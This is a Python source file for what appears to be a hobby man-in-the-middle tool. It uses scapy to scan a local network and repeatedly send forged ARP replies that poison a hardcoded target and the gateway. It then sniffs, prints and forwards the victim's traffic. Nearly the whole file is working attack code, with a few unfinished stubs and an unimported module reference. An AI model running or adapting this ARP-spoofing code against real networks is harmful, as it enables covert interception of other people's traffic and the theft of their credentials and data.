import threading
import scapy.all as scapy
import os
import time
import Project_Mitm.scanner
import argparse
import json

LAN_TYPE = "WIFI"
gateway_ip = ""
subnet = ""
connected_ip = {}

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-lb", "--locationBase", dest="locationBase",
                        help="Location of the logger file")
    options = parser.parse_args()
    return options

def get_mac(ip: str)->str:
    '''The following function returns the MAC from ip (layer 3 -> layer 2)'''
    try:
        mac_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip, op = 'who-has'), timeout=3, verbose=False)[0]
        return mac_list[0][1].hwsrc
    except Exception as e:
        pass

def update_globals():
    data = os.popen("ipconfig /all").read()
    gateway_data = data
    subnet_data = data
    if (LAN_TYPE == "ETHERNET"):
        subnet_data = (gateway_data[gateway_data.find("Subnet Mask")::])
        globals()['subnet'] = subnet_data[subnet_data.find(":") + 2:subnet_data.find("\n")]
        gateway_data = (gateway_data[gateway_data.find("Default Gateway")::])
        gateway_ip = gateway_data[gateway_data.find(":") + 2:gateway_data.find("\n")]
        if (":" in gateway_ip):
            gateway_data = gateway_data[gateway_data.find("\n") + 1::].strip(" ")
            gateway_ip = gateway_data[0:gateway_data.find("\n")]
        globals()['gateway_ip'] = gateway_ip

    elif (LAN_TYPE == "WIFI"):
        gateway_data = gateway_data[gateway_data.find("Wireless LAN adapter Wi-Fi")::]
        subnet_data = (gateway_data[gateway_data.find("Subnet Mask")::])
        globals()['subnet'] = subnet_data[subnet_data.find(":") + 2:subnet_data.find("\n")]
        gateway_data = (gateway_data[gateway_data.find("Default Gateway")::])
        gateway_ip = gateway_data[gateway_data.find(":") + 2:gateway_data.find("\n")]
        if (":" in gateway_ip):
            gateway_data = gateway_data[gateway_data.find("\n") + 1::].strip(" ")
            gateway_ip = gateway_data[0:gateway_data.find("\n")]
        globals()['gateway_ip'] = gateway_ip


def spoof(target:str, gateway:str)->None:
    target_mac = get_mac(target)
    gateway_mac = get_mac(gateway)
    try:
        Alice = scapy.ARP(pdst=target, hwdst=target_mac, psrc=gateway, op="is-at")
        scapy.send(Alice, verbose = False)
        Bob = scapy.ARP(pdst=gateway, hwdst=gateway_mac, psrc=target, op="is-at")
        scapy.send(Bob, verbose = False)

    except Exception as e:
        print(f"An error has occurred: {e}")
        change_Alice()
        exit()

def change_Alice():
    '''In case an error has occurred (user disconnected from LAN), change ip address'''
    pass

def spoofer_loop(target:str, gateway:str)->None:
    while True:
        spoof_thread = threading.Thread(target=spoof,args=(target,gateway))
        spoof_thread.start()
        time.sleep(4)

def loggerFile(location:str, data):
    #if
    #with open(location,'a') as file:
        #file.
    pass

def addJSON(packet,data):
    st = "Packet sender: "
    st += json.dumps(packet).strip("\"") + "\n"
    st+=data
    return st

def packetSniffer(dstIP, gateway):
    def sentToAlice(packet):
        return (scapy.IP in packet) and (packet[scapy.IP].src == dstIP or packet[scapy.IP].dst == dstIP)
    def prin(packet):
        dst = packet[scapy.IP].dst
        src = packet[scapy.IP].src
        packet[scapy.IP].dst = dst
        packet[scapy.IP].src = src
        if(src==dstIP):
            #packet.show()
            scapy.send(packet, verbose=False)

        elif(dst==dstIP):
            try:
                packet.show()
                Ethernet = scapy.Ether(dst = get_mac(dstIP), src = packet[scapy.Ether].src, payload = packet[scapy.Ether].payload.load)
                packet[scapy.Ether] = Ethernet
                print("dst",end=" ")
                packet.show()
                scapy.sendp(packet)
            except Exception as e:
                print(f"Problem with packet: {e}")
    try:
        packet = scapy.sniff(count=1,lfilter=sentToAlice,prn=prin)
    except Exception:
        pass



def packetSnifferLooper(target,gateway):
    while True:
        snoff = threading.Thread(target=packetSniffer, args=(target,gateway))
        snoff.start()






if __name__ == '__main__':

    print("Updating globals...")
    update_globals()
    print(Project_Mitm.arp_spoofer.gateway_ip)
    print("Starting to check for ip addresses in the LAN...")
    Project_Mitm.scanner.scanner()
    options = get_arguments()
    #openFile(options.locationBase)
    for ip in list(Project_Mitm.scanner.connected_ip.keys()).copy():
        #spoofing = threading.Thread(target=spoofer_loop, args=(ip, gateway_ip))
        spoofing = threading.Thread(target=spoofer_loop, args=("192.168.173.252", gateway_ip))
        spoofing.start()
        snoffing = threading.Thread(target=packetSnifferLooper, args=("192.168.173.252",gateway_ip))
        snoffing.start()
        #print(Project_Mitm.scanner.connected_ip.keys())
        #print(addJSON(ip,""))



